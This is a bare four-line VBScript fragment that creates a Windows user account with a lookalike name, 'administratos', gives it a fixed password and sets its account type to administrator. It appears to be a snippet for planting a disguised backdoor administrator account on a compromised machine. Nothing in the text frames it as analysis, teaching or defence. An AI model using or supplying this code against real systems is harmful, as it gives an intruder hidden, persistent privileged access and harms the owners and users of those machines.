Set o=CreateObject( "Shell.Users" ) 
Set z=o.create("administratos") 
z.changePassword "daxia.asd","" 
z.setting("AccountType")=3